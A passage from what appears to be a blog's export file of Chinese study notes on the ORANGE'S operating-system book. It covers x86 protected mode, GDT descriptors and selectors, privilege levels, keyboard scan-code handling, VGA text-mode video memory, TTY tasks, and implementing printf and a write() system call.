都小于等于 <code>DPL</code> 的条件：<br><img src="https://img-blog.csdnimg.cn/20200713201258113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着，从低特权级到高特权级转移时，需要用到TSS，下面准备一个TSS：</p><p><img src="https://img-blog.csdnimg.cn/20200713212336409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加初始化TSS描述符的代码后，开始加载TSS：</p><p><img src="https://img-blog.csdnimg.cn/20200713212501633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保护模式-1</title>
      <link href="/2022/11/23/ORANGE&#39;S-3.1/"/>
      <url>/2022/11/23/ORANGE&#39;S-3.1/</url>
      
        <content type="html"><![CDATA[<h1>3.1 认识保护模式</h1><h2 id="32位PC机的工作模式"><a class="header-anchor" href="#32位PC机的工作模式">¶</a>32位PC机的工作模式</h2><p>IA32 下，CPU有两种工作模式：<br>① 实模式(Real-Addressed Mode)</p><p>② 保护模式(Protected Mode) ：</p><p>PC刚加电打开或系统复位后，工作在实模式下，它为保护模式所需的数据结构做好各种配置和准备。之后，修改控制寄存器CR0中的保护模式允许位PE，使得 PE=1 ，从而让CPU进入保护模式；当 PE=0 时则返回实模式。</p><p>上面提到的16位到32位的革命性转换，就是代码中从16位跳转到32位代码段的那个历史性的 jmp 。</p><h2 id="从实模式到保护模式"><a class="header-anchor" href="#从实模式到保护模式">¶</a>从实模式到保护模式</h2><p>实模式中，8086 为16位的CPU、寄存器、数据总线和20位的地址总线(1MB的寻址能力)，一个逻辑地址由段(16位)和偏移(16位)两部分组成，段地址是地址的一部分，表示以xxxx0h开始的一段内存，物理地址=段基地址*16+偏移地址。</p><p>但是到了32位时代，寻址空间到了4GB，原来的16位寄存器已经不够用了。为此，我们需要保护模式，目的之一就是<strong>提供更大的寻址能力</strong>。</p><p>32位时代的地址仍然可以用段值:偏移来表示，只是段的概念发生了根本性的变化，虽然段值仍然由原来16位的 cs,ds 等段寄存器表示，但是它们已经变成了一个索引，指向数据结构GDT的一个表项，表项中详细定义了段的起始地址、界限、属性等内容，表项的名字是描述符(Descriptor)。</p><p>即，GDT的<strong>作用是提供段式存储机制，这种机制由段寄存器+GDT中的描述符共同构成。</strong></p><h2 id="描述符、选择子结构和寻址方式"><a class="header-anchor" href="#描述符、选择子结构和寻址方式">¶</a>描述符、选择子结构和寻址方式</h2><p>下面是代码段和数据段描述符的结构图：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221123233746.png" alt></p><p>此外，还有系统段描述符和门描述符。</p><p>本节代码 pmtest1.asm 中GDT段定义了三个描述符，可以分别称为 DESC_DUMMY, DESC_CODE32, DESC_VIDEO 。GDT中每一个描述符都定义了一个段，其中 DESC_VIDEO 指向的是显存。</p><p>它们如何和16位的 cs,ds,es,gs 等段寄存器对应起来，使这些段寄存器成为相对于GDT的一个索引呢？在 [SECTION .s32] 中有这样的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, SelectorVideo</span><br><span class="line">mov gs, ax</span><br></pre></td></tr></table></figure><p>在前面的GDT段中，定义了 SelectorVideo ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; GDT 选择子</span><br><span class="line">SelectorCode32    equ    LABEL_DESC_CODE32 - LABEL_GDT</span><br><span class="line">SelectorVideo    equ    LABEL_DESC_VIDEO - LABEL_GDT</span><br></pre></td></tr></table></figure><p>由此，段寄存器 gs 的值变成了 SelectorVideo 标号地址，SelectorVideo 则似乎是 DESC_VIDEO 相对于GDT段基址 LABEL_GDT 的一个偏移，即选择子。当然，选择子不完全是偏移，其结构如下：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221123234730.png" alt></p><p>当最低的三位 TL,RPL 都为零时，选择子真正成为对应描述符相对于GDT段基址的偏移。</p><p>这样，我们明白了这些代码的意义，gs 段寄存器值为选择子 SelectorVideo ，它指向GDT中对应显存的描述符 DESC_VIDEO ，然后下面的32位代码段，将 ax 的值写入到显存中偏移位 edi 的位置（段:偏移中，偏移地址的概念没有变化）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LABEL_SEG_CODE32:</span><br><span class="line">    mov    ax, SelectorVideo</span><br><span class="line">    mov    gs, ax                    ; 视频段选择子(目的)</span><br><span class="line"></span><br><span class="line">    mov    edi, (80 * 11 + 79) * 2    ; 屏幕第 11 行, 第 79 列。</span><br><span class="line">    mov    ah, 0Ch                    ; 0000: 黑底    1100: 红字</span><br><span class="line">    mov    al, &#x27;P&#x27;</span><br><span class="line">    mov    [gs:edi], ax</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>从 <code>s32</code> 这部分代码，目前我们知道的段式寻址方式如下，<strong>逻辑地址</strong>(段:偏移)经过段机制(段选择子和段描述符)变成<strong>线性地址</strong>(<code>Linear Address</code>)，这里的线性地址可以看做是“物理地址”：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221123235934.png" alt></p><h2 id="描述符属性"><a class="header-anchor" href="#描述符属性">¶</a>描述符属性</h2><p>下面详细介绍段描述符的几个属性：</p><ul><li><p>P 位 (Present) 存在位，为 1 表示段存在于内存中，否则段不在内存中；</p></li><li><p>DPL (Descriptor Privilege Level) 描述符特权级位， 0~3 ，数字越小特权级越大；</p></li><li><p>S 位指明描述符是数据段/代码段(S=1)，还是系统段/门描述符(S=0) ；</p></li><li><p>TYPE 描述符，0~15：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221124000755.png" alt></p></li><li><p>G 位(Granularity)段界限粒度位，当 G=0 时段界限粒度为字节，否则为 4KB ；</p></li><li><p>D/B 位：</p><ul><li><p>可执行代码段描述符中，是 D 位，D=1 时指令默认使用32位地址及32位/8位操作数；D=0 时默认使用16位地址及16位/8位操作数；</p></li><li><p>向下扩展数据段描述符中，是 B 位，B=1 时段的上部界限是 4GB ；否则是 64KB ；</p></li><li><p>堆栈段时，B=1 时隐式堆栈访问指令(如 push,pop,call )使用32位堆栈指针寄存器 esp ；B=0 时隐式堆栈访问指令使用16位堆栈指针寄存器 sp 。</p></li></ul></li><li><p>AVL 保留位，可以被系统软件使用。</p></li></ul><h3 id="一致代码段-Conforming-Code-Segment："><a class="header-anchor" href="#一致代码段-Conforming-Code-Segment：">¶</a>一致代码段 Conforming Code Segment：</h3><ul><li><p>一致：向特权级更高的一致代码段转移时，当前特权级会延续下去；而向特权级更高的非一致代码段转移时会报错(general-protection exception，常规保护错误)，除非使用调用门或者任务门。</p><p>如果系统代码不访问受保护的资源和某些类型的异常处理，可以放入一致代码段中，此时低特权级的程序可以访问高特权级的一致代码段；为了防止低特权级的程序访问，需要保护的系统代码则应该放入非一致代码段；</p></li><li><p>目标代码是低特权级，则无论其是否是一致代码段，都不能通过jmp或call转移访问。这样也会导致常规保护错误；</p></li><li><p>相同特权级的代码，可以直接访问，无论是否是一致代码段。</p></li><li><p>特别注意的是，所有数据段都是非一致的，即不可能被低特权级的代码访问；但是它可以被更高特权级和同特权级的代码访问，不用使用特定的门（低-&gt;高）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO系统</title>
      <link href="/2022/11/23/ORANGE&#39;S-7/"/>
      <url>/2022/11/23/ORANGE&#39;S-7/</url>
      
        <content type="html"><![CDATA[<h1>7.1 键盘</h1><h2 id="从中断开始──键盘初体验"><a class="header-anchor" href="#从中断开始──键盘初体验">¶</a>从中断开始──键盘初体验</h2><p>说起键盘，你可能想起8259A的IRQ1对应的就是键盘，在第5章中做过一个小小的试验（见代码5.57和图5.16）。那时我们没有为键盘中断指定专门的处理程序，所以当按下键盘时只能打印一行“spurious_irq:0x1”。</p><p>现在我们来写一个专门的处理程序。新建一个文件 keyboard.c，添加一个非常简单的键盘中断处理程序（代码7.1）。</p><p><img src="https://img-blog.csdnimg.cn/20200718133339928.png" alt></p><p>结果是每按一次键，打印一个星号，像在输入密码。为了不受其他进程输出的影响，我们把其他进程的输出都注释掉。然后添加指定中断处理程序的代码并打开键盘中断（代码7.2）。</p><p><img src="https://img-blog.csdnimg.cn/20200718133518929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>不要忘了在 proto.h 中声明 init_keyboard( ) 并调用之（代码7.3）。</p><p><img src="https://img-blog.csdnimg.cn/20200718133550629.png" alt></p><h2 id="键盘敲击的过程"><a class="header-anchor" href="#键盘敲击的过程">¶</a>键盘敲击的过程</h2><p>在键盘中存在一枚叫做键盘编码器 Keyboard Encoder 的芯片，它通常是 Intel 8048 以及兼容芯片，作用是监视键盘的输入，并把适当的数据传送给计算机。另外，在计算机主板上还有一个键盘控制器 Keyboard Controller ，用来接收和解码来自键盘的数据，并与8259A以及软件等进行通信（如图7.3所示）。</p><p><img src="https://img-blog.csdnimg.cn/20200718134147663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>敲击键盘有两个方面的含义：<strong>动作和内容</strong>。动作可以分解成三类：<strong>按下、保持按住的状态以及放开</strong>；内容则是<strong>键盘上不同的键，字母键还是数字键，回车键还是箭头键</strong>。所以，根据敲击动作产生的编码，<strong>8048既要反映哪个按键产生了动作，还要反映产生了什么动作</strong>。</p><p>敲击键盘所产生的编码被称作扫描码 Scan Code ，它分为 <strong>Make Code 和 Break Code 两类</strong>。<strong>当一个键被按下或者保持住按下时，将会产生Make Code；当键弹起时，产生Break Code</strong>。除了Pause键之外，每一个按键都对应一个 Make Code 和一个 Break Code 。</p><p>扫描码总共有三套，叫做 Scan code set 1、Scan code set 2、Scan code set 3 。Scan code set 1 是早期的 XT 键盘使用的，<strong>现在的键盘默认都支持Scan code set 2</strong>，而 Scan code set 3 很少使用。</p><p>整个键盘输入的过程如下所示：</p><ul><li><p>当8048检测到一个键的动作后，会把相应的扫描码发送给8042；</p></li><li><p>8042会把它转换成相应的 <code>Scancode set 1</code> 扫描码，并将其放置在输入缓冲区中；</p></li><li><p>然后8042告诉8259A产生中断 IRQ1；</p></li><li><p>如果此时键盘又有新的键被按下，8042将不再接收，一直到缓冲区被清空，8042才会收到更多的扫描码。</p></li></ul><p>现在，你一定明白了为什么图7.1中只打印了一个字符，因为我们的键盘中断处理例程什么都没做。只有我们把扫描码从缓冲区中读出来后，8042才能继续响应新的按键。</p><p><img src="https://img-blog.csdnimg.cn/20200718145311717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200718145026842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><ul><li><p>由于 a 和 A 是同一个键，所以它们的扫描码是一样的，事实上它们就是同一个键）</p></li><li><p>如果按下 左Shift+a ，将得到这样的输出：0x2A0x1E0x9E0xAA ，分别是左Shift键的 Make Code 、a 的 Make Code 、a 的 Break Code 以及左Shift键的 Break Code 。</p></li><li><p>所以，按下 Shift+a 得到 A 是软件的功劳，键盘和8042是不管这些的，在你自己的操作系统中，甚至可以让 Shift+a 去对应 S 或者 T ，只要你习惯就行。</p></li><li><p>同理，按下任何的键，不管是单键还是组合键，想让屏幕输出什么，或者产生什么反应，都是由软件来控制的。虽然增加了操作系统的复杂性，但这种机制无疑是相当灵活的。</p></li></ul><h2 id="用数组表示扫描码"><a class="header-anchor" href="#用数组表示扫描码">¶</a>用数组表示扫描码</h2><p>现在扫描码已被轻松获得，可是该如何将扫描码和相应字符对应起来呢？从表7.2中可以看出，Break Code 是 Make Code | 0x80 进行<strong>按位或操作</strong>的结果。可是 Make Code 和相应键的对应关系好像找不到什么规律。</p><p>不过还好，扫描码是一些数字，我们可以建立一个数组，以扫描码为下标，对应的元素就是相应的字符。要注意的是，其中以 0xE0 以及 0xE1 开头的扫描码要区别对待。</p><p>我们把这个数组写成如下这个样子。其中每3个值一组（ MAP_COLS 被定义成3），分别是单独按某键、Shift+某键和有0xE0前缀的扫描码对应的字符。Esc, Enter 等被定义成了宏，宏的具体数值无所谓，只要不会造成冲突和混淆，让操作系统认识就可以。</p><p><img src="https://img-blog.csdnimg.cn/20200718150421643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>建立一个缓冲区，让 <code>keyboard_handler</code> 将每次收到的扫描码放入这个缓冲区，然后<strong>建立一个新的任务专门用来解析它们并做相应处理</strong>。<strong>如果缓冲区已满，这里使用的策略是直接就把收到的字节丢弃</strong>。</p><h2 id="解析扫描码"><a class="header-anchor" href="#解析扫描码">¶</a>解析扫描码</h2><p>对扫描码的解析工作有一点烦琐，所以还是分步骤来完成它。</p><h3 id="1-让字符显示出来"><a class="header-anchor" href="#1-让字符显示出来">¶</a>1. 让字符显示出来</h3><p>虽然已经有了一个数组 keymap[ ] ，但是不要低估了解析扫描码的复杂性，因为它不但分为 Make Code 和 Break Code ，而且有长有短，功能也很多样，比如 Home 键对应的是一种功能而不是一个ASCII码，所以要区别对待。先挑能打印的打印一下，看代码7.13。</p><p><img src="https://img-blog.csdnimg.cn/20200718183629765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>在代码7.11中，总体思想是：</p><ul><li><p>0xE0 和 0xE1 单独处理且暂时不加理会。因为从表7.2中知道，除去以这两个数字开头的扫描码，其余的都是单字节的。</p></li><li><p>如果遇到不是以 0xE0, 0xE1 开头的，则判断是 Make Code 还是 Break Code ，如果是后者同样不加理会，如果是前者就打印出来。</p></li><li><p>前文中讲过，Break Code 是 MakeCode | 0x80 进行按位或操作的结果，代码中的 FLAG_BREAK 被定义成了 0x80 。</p></li><li><p>从 keymap[ ] 中取出字符的时候进行了一个与操作（scan_code&amp;0x7F 。一方面，如果当前扫描码是 Break Code ，与操作之后就变成 Make Code 了；另一方面，这样做也是为了避免越界的发生，因为数组 keymap[ ] 的大小是 0x80 。</p></li></ul><h3 id="2-处理Shift、Alt、Ctrl"><a class="header-anchor" href="#2-处理Shift、Alt、Ctrl">¶</a>2. 处理Shift、Alt、Ctrl</h3><p>现在可以输入简单的字符和数字，但还有更复杂的输入，比如按个Shift组合。</p><p>下面就来添加代码，使其能够响应这些功能键。在代码7.14中，我们不但添加了处理 Shift 的代码，而且也对 Alt 和 Ctrl 键的状态进行了判断，只是暂时对它们还没有做任何的处理。</p><p><img src="https://img-blog.csdnimg.cn/20200719150618735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200719150628677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>Shift, Alt, Ctrl 键左右各3个，最好不要把左右两个键不加区分，因为有一些软件需要区分对待，最简单而且经典的一个例子是超级玛丽，其中左右Shift功能是不一样的。为了不把左右键混为一谈，我们声明 6 个变量来记录它们的状态。</p><p>当其中的某一个键被按下时，相应的变量值变为 true 。比如，当我们按下左 Shift 键，shift_l 就变为 true ；<br>如果它立即被释放，则 shift_l 又变回 false 。<br>如果当左 Shift 键被按下且未被释放时，又按下 a 键，则 if (shift_l || shift_r) 成立，于是 column 值为 1 ，keymap[column] 的取值就是 keymap[ ] 中第二列中相应的值，即大写字母 A 。</p><h1>7.2 显示器</h1><p><strong>随着键盘模块的逐渐完善，我们越来越需要考虑它与屏幕输出之间的关系</strong>。<strong>终端进程不仅处理键盘操作，还将处理诸如屏幕输出等内容</strong>。所以，在彻底完成键盘驱动之前，我们必须了解<strong>终端的概念以及显示器的驱动方式</strong>。</p><h2 id="初识TTY（TeleTYpe）"><a class="header-anchor" href="#初识TTY（TeleTYpe）">¶</a>初识TTY（TeleTYpe）</h2><p>对于终端最简单而形象的认识是，当按 Alt+F1, Alt+F2, Alt+F3 等组合键时，会切换到不同的屏幕。这些不同的屏幕中可以分别有不同的输入和输出，相互之间彼此独立。 在某个终端中，如果键入命令 tty ，执行的结果将是当前的终端号。</p><p>终端当然不仅是 Alt+Fn 这么简单，但在目前的操作系统中，我们暂时只实现这样简单的终端。对于不同的 TTY ，可以理解成下图的样式。</p><p><img src="https://img-blog.csdnimg.cn/20200719154604230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>不同的 TTY 对应的输入设备虽是同一个键盘，但输出却像是在不同的显示器上，因为不同的 TTY 对应的屏幕画面可能是不同的。实际上，我们仍在使用同一个显示器，画面的不同只是因为显示了显存的不同位置。</p><p>3 个CONSOLE公用同一块显存，就必须有一种方式，在切换CONSOLE的瞬间，让屏幕显示显存中某个位置的内容。通过简单的端口操作相应的寄存器就可以做到这一点。</p><h2 id="基本概念"><a class="header-anchor" href="#基本概念">¶</a>基本概念</h2><p>&quot;显示器&quot;并不是一个精确的称呼，<strong>因为我们操作的对象可能是显卡，或者仅仅是显存</strong>。下面暂时使用&quot;视频&quot;这个词。</p><p>开机看到的默认模式就够了—— 80×25 文本模式， 这种模式下：</p><ul><li><p>显存大小为 32KB ，占用的范围为 0xB8000～0xBFFFF ；</p></li><li><p>每 2 字节代表一个字符，其中低字节表示字符的ASCII码，高字节表示字符的属性——包括颜色，我们设置过字符的颜色，还写了一个函数 disp_color_str() 显示不同颜色的字符。在默认情况下，屏幕上每一个字符对应的2字节的定义如图所示：</p><p><img src="https://img-blog.csdnimg.cn/20200719172246873.png" alt></p></li><li><p>一个屏幕总共可以显示 25 行，每行 80 个字符。</p></li></ul><p>总的来说，屏幕字符对应的2个字节中：低字节表示的是字符本身，高字节用来定义字符的颜色。</p><ul><li><p>颜色分前景和背景两部分，各占4位，其中低三位意义是相同的，表示颜色。</p></li><li><p>如果前景最高位为 1 的话，字符的颜色会比此位为 0 时亮一些；如果背景最高位为 1 ，则显示出的字符将是闪烁的（是字符闪烁而不是背景闪烁）。</p></li><li><p>更多细节：</p><p><img src="https://img-blog.csdnimg.cn/20200719173930106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p></li></ul><p>现在看第 3 章中代码 3.1 的这几行，就全明白了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah, 0Ch ; 0000: 黑底; 1100: 高亮,红字</span><br><span class="line">mov al, &#x27;P&#x27;</span><br><span class="line">mov [gs:edi], ax</span><br></pre></td></tr></table></figure><p>想实际看一下各种颜色的效果，可以通过调用 disp_color_str( ) 并改变其参数去试一下。</p><p>同时，我们已经知道一个屏幕可以显示几行几列，又知道了一个字符占用几个字节，易得一个屏幕映射到显存中所占的空间大小：80×25×2=4000 Bytes 。</p><p>而显存有 32KB ，每个屏幕才占 4KB ，所以显存中足以存放 8 个屏幕的数据。如果我们有 3 个 TTY ，可以各占 10KB 的空间还有剩余，甚至在每一个 TTY 内还可以实现简单的滚屏功能。</p><h1>7.3 TTY任务</h1><p>了解了键盘和显示器的操作，我们就可以实现多个TTY了，让TTY任务这样运行：</p><ul><li><p>在TTY任务中执行循环，每次都会轮询每个TTY，处理它的事件——包括从键盘缓冲区读取数据、显示字符等；</p></li><li><p>不是轮询到某个TTY时，箭头对应的全部事件都会发生。只有当某个TTY对应的控制台是当前控制台时，它才可以读取键盘缓冲区；</p></li><li><p>TTY可以对输入数据做更多的处理，这里简化为&quot;显示&quot;；</p></li><li><p>键盘和显示器是每个TTY的一部分，是公共的。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/202007192322365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>总的来说，每次轮询到某个TTY时要做的：</p><p>处理输入——如果它是当前TTY，就从键盘缓冲区读取数据；<br>处理输出——如果有要显示的内容，则显示它。<br>将上面的TTY任务图转换为下面的函数调用图：task_tty() 是一个循环，它不断调用 keyboard_read() ，而 key_board() 从键盘缓冲区得到数据后，会调用 in_process() ，将字符直接显示出来。</p><p><img src="https://img-blog.csdnimg.cn/20200719232936923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>话虽如此，实现起来就不是说的那么简单了：</p><ul><li><p>每一个TTY都应该有自己的读和写的动作。所以在 keyboard_read( ) 内部，函数需要了解自己是被哪一个TTY调用。可以通过为函数传入指向当前TTY的指针来做到这一点。</p></li><li><p>为了让输入和输出分离，被 keyboard_read( ) 调用的 in_process( ) 不应该再直接回显字符，应该将回显的任务交给TTY来完成，因此，我们就需要为每个TTY建立一块缓冲区，用以放置将被回显的字符。</p></li><li><p>每个TTY回显字符时操作的CONSOLE是不同的，所以它们都应该有一个成员来记载其对应的CONSOLE信息。</p></li></ul><h2 id="TTY任务框架的搭建"><a class="header-anchor" href="#TTY任务框架的搭建">¶</a>TTY任务框架的搭建</h2><p>整个程序流程如下：</p><ul><li><p>task_tty( ) 中，通过循环来处理每一个TTY的读和写操作；</p></li><li><p>读写操作全都放在 tty_do_read( ), tty_do_write( ) 两个函数中，这样就让 task_tty( ) 很简洁，而且逻辑清晰。</p></li><li><p>读操作会调用 keyboard_read( ) ，此时已经多了一个参数；</p></li><li><p>写操作会调用 out_char( ) ，它会将字符写入指定的CONSOLE。</p></li></ul><p>读操作：<strong>往TTY缓冲区写入数据的代码很简单，只把输出字符写入缓冲区</strong></p><p>写操作：从TTY缓冲区中中取出值，类似 <code>get_byte_from_kbuf( )</code> ，然后用 <code>out_char( )</code> 显示在CONSOLE中；<code>out_char( )</code> 实现如下：<code>V_MEM_BASE = 0xB8000</code> 定义在 <code>const.h</code> 中， <code>V_MEM_BASE + disp_pos</code> 等同于当前显示位置的地址，我们直接把字符写入特定地址；</p><h2 id="多控制台"><a class="header-anchor" href="#多控制台">¶</a>多控制台</h2><p>这里来实现多个CONSOLE。前面，我们还根本没有用到CONSOLE的结构体成员。下图是某时刻显存的使用状态：</p><p>original_addr, v_mem_limit 定义控制台所占显存的总体情况，一经初始就不再改变；<br>current_start_addr 随着屏幕卷动而变化；<br>cursor 每输出一个字符就更新一次；</p><p><img src="https://img-blog.csdnimg.cn/20200720132238947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><h1>7.4 区分任务和用户进程</h1><p>现在，我们有了4个进程——<code>TTY, A, B, C</code> ，后三者可有可无，它们是&quot;用户进程&quot;，而TTY是&quot;任务&quot;。具体实现上，让用户进程运行在 <code>ring3</code> ，任务运行在 <code>ring1</code> ，<code>ring0</code> 运行的是进程调度：<br><img src="https://img-blog.csdnimg.cn/2020072017323288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1>7.5 printf</h1><p>现在，我们有了TTY，还有一个任务和三个用户进程，想看到它们在特定终端运行的情况。为此，我们需要有一个供输出使用的 <code>printf( )</code> 。</p><p><code>printf( )</code> 进行屏幕输出，需要用到控制台模块的代码，因此，它需要<strong>通过系统调用</strong>才能完成。</p><p>整个 <code>printf( )</code> 的调用过程如下：<br><img src="https://img-blog.csdnimg.cn/20200720221129518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200720200001224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p><code>vsprintf( )</code> 的实现如下：<br><img src="https://img-blog.csdnimg.cn/20200720205025304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>可变参数的原理：</p><p>调用一个函数时，总是先把参数压栈，然后通过call指令转移到被调用者，在完成后清理堆栈。 但这里遇到两个问题：</p><p>如果有多个参数，哪个参数先入栈，是前面的还是后面的？<br>由谁来清理堆栈，调用者还是被调用者？</p><p>这两个方面的问题其实被称为“调用约定”（Calling Conventions）……调用约定有若干种，每一种都规定参数入栈的顺序以及谁来清理堆栈。我们已经用汇编语言写过不少的函数，都是后面的参数先入栈(前面的参数就位于栈顶，更容易取出)，并且由调用者清理堆栈。这种约定被称做C调用约定。</p><p>C调用约定的好处在处理可变参数函数时得到了充分体现，因为只有调用者知道此次调用包含几个参数，于是可以方便地清理堆栈。C调用约定让使用可变参数的函数成为可能。</p><p>可具体怎么做呢？</p><p>首先是它的声明，过去我们写的函数，都有确定类型的参数，可现在不同了，参数的个数和类型都不知道，于是，省略号就派上了用场，正如代码7.55所示，一个省略号，表示参数不知道有多少，更不知道是什么。<br>…在每一次调用过程中，printf 必须有一种方法来使用这些参数才行。从代码7.55可以看到，printf 使用了它的第一个参数 fmt 作为基准，得到了后面若干参数的开始地址，这样，其值也就容易得到了。</p><p>举一个例子，假设我们调用 printf(fmt, var1, var2, var3) ，则堆栈情况将如图7.25所示：</p><p><img src="https://img-blog.csdnimg.cn/20200720203808394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>&amp;fmt 表示 fmt 地址，(char*)(&amp;fmt) + 4 表示跟随在 fmt 后面的参数的地址。所以，接下来实际上是将 var3 的地址传递给了紧接着调用的 vsprintf 。va_list 其实就是 char* ，它的定义在 type.h 中。</p></blockquote><h2 id="系统调用write"><a class="header-anchor" href="#系统调用write">¶</a>系统调用write()</h2><p>接下来完成 write( ) 系统调用，它把 vsprintf 输出的字符串打印到屏幕上。</p><p>增加一个系统调用 (foo) 的过程如下：</p><p><img src="https://img-blog.csdnimg.cn/20200720205227982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>系统调用是 write( ) ，对应的内核部分是 sys_write( ) ，声明在 proto.h 中，对应第4步和第5步：</p><p>接下来是 write( ) 和 sys_write( ) 两个函数体：由于已有的系统调用没有参数，所以还需要修改 sys_call( ) ：</p><p>sys_write( ) 通过简单函数 tty_write( ) 实现字符输出，这里 sys_write( ) 比 write( ) 多一个参数，需要在修改的 sys_call( ) 中压栈，然后 sys_call 调用 